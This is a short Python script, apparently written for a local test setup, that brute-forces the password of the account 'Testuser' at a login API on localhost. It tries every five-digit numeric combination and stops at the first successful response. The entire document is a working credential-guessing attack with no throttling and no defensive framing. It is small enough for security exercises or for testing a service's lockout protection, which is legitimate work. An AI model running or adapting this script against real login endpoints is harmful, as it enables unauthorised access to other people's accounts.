import requests
import time
import itertools
import string

# more restrictions -> less waiting time
max_length = 5
min_length = 5
charset = string.digits#string.ascii_lowercase  + string.ascii_uppercase + string.digits

url = 'http://localhost:8002/api/login'

start_time = time.time()

data = {
    "username": "Testuser",
    "password": "",
}

found = False

# Generate all combinations for lengths 1 to max_length
for length in range(min_length, max_length+1):
    # Use itertools.product to generate the Cartesian product (combinations)
    for combination in itertools.product(charset, repeat=length):
        # Join the tuple to form the string
        print(''.join(combination))
        data["password"] = str(''.join(combination))
        response = requests.post(url, json=data)
        if(response.status_code == 200):
            found = True
            break
    if found:
        break

end_time = time.time()
time_taken = end_time - start_time

print(f"Password found: {data["password"]}")
print(f"Time taken: {time_taken:.2f} seconds")
